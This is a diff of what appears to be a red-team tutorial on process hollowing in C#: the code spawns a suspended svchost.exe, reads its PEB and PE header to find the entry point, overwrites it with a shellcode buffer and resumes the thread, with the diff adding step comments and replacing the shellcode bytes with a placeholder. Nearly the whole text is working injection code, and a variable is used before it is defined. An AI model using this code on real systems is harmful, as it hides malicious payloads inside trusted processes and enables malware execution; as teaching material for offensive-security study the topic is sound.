@@ -4,18 +4,22 @@ we must remember to specify a 64-bit architecture (since svchost.exe is a 64-bit
 
 While the code and technique here only writes shellcode into the suspended process, we could also use this technique to hollow an entire compiled EXE.
 
-
+      ***<comment> DllImport statement for CreateProcess<comment>***
+      
       [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
       static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, 
           IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, 
               uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, 
                   [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+       ***<comment>DllImport statement for ZwQueryInformationProcess<comment>***
       
       [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
       private static extern int ZwQueryInformationProcess(IntPtr hProcess, 
           int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, 
               uint ProcInfoLen, ref uint retlen);
-      
+
+      ***<comment>ReadProcessMemory DllImport statement<comment>***
       
         [DllImport("kernel32.dll", SetLastError = true)]
       static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, 
@@ -23,26 +27,36 @@ While the code and technique here only writes shellcode into the suspended proce
       
       [DllImport("kernel32.dll", SetLastError = true)]
       private static extern uint ResumeThread(IntPtr hThread);
+
+      ***<comment>Calling CreateProcess to create a suspended process<comment>***
       
       STARTUPINFO si = new STARTUPINFO();
       PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
       
       bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, 
           IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
+
+      ***<comment>Calling ZwQueryInformationProcess to fetch PEB address<comment>***
       
       PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
       uint tmp = 0;
       IntPtr hProcess = pi.hProcess;
       ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
+
+      ***<comment>ReadProcessMemory invocation<comment>***
       
       byte[] addrBuf = new byte[IntPtr.Size];
       IntPtr nRead = IntPtr.Zero;
       ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
       
       IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
+
+      ***<comment>Using ReadProcessMemory to fetch the PE header<comment>***
       
       byte[] data = new byte[0x200];
       ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
+
+      ***<comment>Parsing the PE header to locate the EntryPoint<comment>***
       
       uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
       
@@ -51,14 +65,18 @@ While the code and technique here only writes shellcode into the suspended proce
       uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
       
       IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
+
+      ***<comment>Overwriting the EntryPoint of svchost.exe with shellcode<comment>***
       
-      byte[] buf = new byte[659] {
-      0xfc,0x48,0x83,0xe4,0xf0,0xe8...
+      byte[] buf = new byte[659] {generated shell code};
+      
       
       WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
       
       IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
-      
+
+       ***<comment>calling ResumeThread<comment>***
+       
       ResumeThread(pi.hThread);
 
 
